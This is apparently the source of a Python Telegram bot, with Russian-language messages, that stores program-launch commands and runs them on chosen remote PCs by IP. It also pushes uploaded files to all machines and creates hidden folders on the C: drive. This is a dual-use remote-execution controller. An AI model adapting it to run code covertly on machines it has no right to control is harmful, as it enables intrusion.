import asyncio
from aiogram import types
from bot_cnf import *

create_hidden_folder('C:/scripts')
create_hidden_folder('C:/scripts/data')

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    if await sql.user_exists(message.from_user.id):
        await sql.new_user(message.from_user.id, message.from_user.username)
    await message.answer(start_, parse_mode='MarkdownV2')


@dp.message_handler(commands=['h', 'help'])
async def bot_help(message: types.Message):
    await message.answer(help_, parse_mode='MarkdownV2')


@dp.message_handler(sql.is_admin)
async def not_admin(message: types.Message):
    await message.answer(f"Вы не админ, вот ваш id: `{message.from_user.id}`", parse_mode='MarkdownV2')

@dp.message_handler(commands=['l', 'log'])
async def read_log_s(message: types.Message):
    with open('app.log', 'rb') as f:
        await message.answer_document(document=f)


@dp.message_handler(commands=['p', 'prog', 'program'])
async def program(message: types.Message):
    args = message.get_args()
    args = args.replace('\\', '/')

    if args.count(' @.@ '):
        args = args.split(' @.@ ')
        await sql.add_command(message.from_user.id, args[0], args[1])
        await message.answer(f"Была записана команда: \n`{args[0]}`\nПод названием: `{args[1]}`", parse_mode='MarkdownV2')

    else:
        await message.answer('Введите аргументы для функции типа: \n`/program C:/Program Files/Google/Chrome/Application/chrome.exe, --new-window, https://www.google.com @.@ Google`\n'
                             '*Не забывайте про разделение команд и аргументов *`(, )`* и названия *`( @.@ )`', parse_mode='MarkdownV2')


@dp.message_handler(commands=['a', 'act', 'activate'])
async def activate(message: types.Message):
    resp = await sql.read_for_bot(message.from_user.id)
    kb = inline(resp, prefix='a')

    await message.answer('Выберете задачу, которую хотите запустить:', reply_markup=kb)

@dp.message_handler(commands=['d', 'del', 'delete'])
async def delete(message: types.Message):
    kb = inline(await sql.read_for_bot(message.from_user.id), prefix='d')
    await message.answer('Выберете задачу, которую хотите удалить:', reply_markup=kb)

@dp.callback_query_handler(lambda callback: callback.data[0] == 'a')
async def callback(callback: types.CallbackQuery):
    command_id = int(callback.data.split('_')[1])
    command_name = await sql.command_name_from_id(command_id)

    kb = inline(await sql.get_pc(), f'f_{command_id}')

    await callback.message.edit_text(f'Выберете компьютер для команды `{command_name}`:', reply_markup=kb, parse_mode='MarkdownV2')


@dp.callback_query_handler(lambda callback: callback.data[0] == 'd')
async def callback(callback: types.CallbackQuery):
    command_id = int(callback.data.split('_')[1])
    command_name = await sql.command_name_from_id(command_id)

    await sql.delete_command(command_id)
    await callback.message.edit_text(f'Команда `{command_name}` была удалена \.', parse_mode='MarkdownV2')

@dp.callback_query_handler(lambda callback: callback.data[0] == 'f')
async def f_activate(callback: types.CallbackQuery):
    data = callback.data.split('_')
    command_id = int(data[1])
    ip = data[2]

    command_name = await sql.command_name_from_id(command_id)

    await callback.message.edit_text(f'Задача `{command_name}` запущена на `{ip}`\.', parse_mode='MarkdownV2')

    await sql.activate_command(command_id, ip)

    await asyncio.sleep(timing())

    await sql.deactivate_command()

    await callback.message.edit_text(f'Задача `{command_name}` выполнена на  `{ip}`\.', parse_mode='MarkdownV2')

@dp.message_handler(content_types='document')
async def handle_docs(message: types.Message):
    document = message.document
    file_id = document.file_id
    await message.reply(f"Received document with file_id: {file_id}", parse_mode=None)

    # Запросить файл у Telegram
    file_info = await bot.get_file(file_id)

    # Скачать файл
    file_path = os.path.join('C:/scripts/data', document.file_name)  # указан путь 'C:/scripts/data'
    with open(file_path, 'wb') as file:
        await bot.download_file(file_info.file_path, destination=file)

    await sql.add_command(message.from_user.id, f'download, /link/{document.file_name}', f'download {document.file_name}', hidden=1)

    command_id = await sql.get_last_command(message.from_user.id)
    command_id = command_id[0]

    await sql.activate_command(command_id, 'all')

    await asyncio.sleep(timing())

    await sql.deactivate_command()


if __name__ == '__main__':
    aiogram.executor.start_polling(dp, skip_updates=True, on_startup=lambda dp: sql.connect(), on_shutdown=lambda dp: sql.close())
